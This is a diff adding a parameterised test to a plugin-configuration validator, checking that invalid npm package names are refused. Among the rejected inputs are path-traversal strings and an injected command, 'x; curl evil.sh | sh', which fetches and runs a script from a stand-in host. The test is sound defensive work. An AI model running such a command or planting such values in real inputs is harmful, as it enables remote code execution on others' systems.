@@ -32,6 +32,23 @@ describe('plugins is a list of named entries', () => {
     expect(result.data?.plugins).toEqual(plugins)
   })
 
+  it.each([
+    '@vostride/agent-qa-x/../../../evil',
+    '..',
+    '@vostride/..',
+    'x; curl evil.sh | sh',
+    '.hidden',
+    'https://npm.example/@a/b/-/b-1.tgz',
+  ])('refuses %j as a package, because it is not an npm package name', (name) => {
+    const result = parse([{ name: 'acme', package: name }])
+
+    expect(result.success).toBe(false)
+    expect(JSON.stringify(result.error?.issues)).toContain(
+      'package must be an npm package name, such as @vostride/agent-qa-plugin-kernel; '
+        + 'name a folder with path instead',
+    )
+  })
+
   it('refuses two entries with the same name', () => {
     const result = parse([
       { name: 'acme', package: '@acme/agent-qa-plugin' },
